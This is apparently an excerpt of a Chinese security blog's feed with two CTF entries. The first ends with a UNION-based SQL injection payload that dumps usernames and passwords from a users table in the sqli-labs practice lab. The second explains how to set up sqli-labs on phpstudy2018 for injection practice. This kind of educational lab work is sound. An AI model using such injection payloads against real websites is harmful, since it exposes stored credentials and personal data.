<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password),3 from users  --+</span></span><br></pre></td></tr></table></figure>
<p><img src="selectend.jpg" /></p>
<p>less1-less4的注入就此结束，数据库中的所有信息都能获取到！</p>
<h2 id="x01">0x01</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入一</title>
    <url>/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
    <content><![CDATA[<h2 id="x00-环境配置与工具">0x00 环境配置与工具</h2>
<p>​
phpstudy2018、sqli_lab（sqli_lab的运行最好使用旧版本php，这里使用php5.x）</p>
<span id="more"></span>
<p>sqli_lab可以从github上直接下载：https://github.com/Audi-1/sqli-labs</p>
<p><img src="sqli-lab.png" /></p>
<p>phpstudy2018、sqli_lab都打包在一下网盘链接里，直接获取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1UBWgP4RTyeHSwLo7-elfgg </span><br><span class="line">提取码：ycnm</span><br></pre></td></tr></table></figure>
<h2 id="x01-环境安装配置">0x01 环境安装配置</h2>
<p>首先解压后右键点击以管理员身份运行phpstudy2018.exe文件，选择安装路径，<strong>注意安装路径中不能包含中文与空格</strong>.</p>
<p><img src="phpstudy.jpg" /></p>
<p>在安装路径下找到phpstudy.exe文件即可运行</p>
<p><img src="openphp.jpg" /></p>
<p><img src="php.jpg" /></p>
<p>在切换版本里可以选择不同的php版本，系统服务选中时会在设备开机时自动打开此系统。</p>
<p>接下来是sqli_lab的配置，将GitHub上下载的sqli_lab压缩包解压，找到phpstudy2018的安装路径，打开
PHPTutorial-&gt;WWW ,复制整个sqli_lab文件夹到WWW文件夹下.</p>
<p><img src="WWW.png" /></p>
<p>到phpstudy的安装路径中启动php,<strong>（注意要先启动phpstudy,再往下，不然会找不到相关文件）</strong>再打开复制过来的sqli_lab-master文件夹，找到sql-connections打开，并且打开里面的db-creds.inc文件，将$dbpass数值改为root.</p>
<p><img src="connection.jpg" /></p>
<p>浏览器输入地址：127.0.0.1/sqli-labs-master/，<strong>注意phpstudy默认的本地端口为8080，如果有使用需要更换端口</strong>.</p>
<p>更换端口：在php窗口中选择 其他选项菜单 -&gt; phpstudy设置 -&gt;
端口常规设置，打开后可填入可用端口后点击应用即可</p>
<p><img src="duankou.jpg" /></p>
<p>将网址填入浏览器后出现以下页面</p>
<p><img src="database.jpg" /></p>
<p>点击Setup/reset Database for labs，出现以下页面表示环境搭建成功</p>
<p><img src="success.jpg" /></p>
<p><strong>到此，环境就搭建成功啦，可以开始奇妙的注入之旅辣！</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
</search>
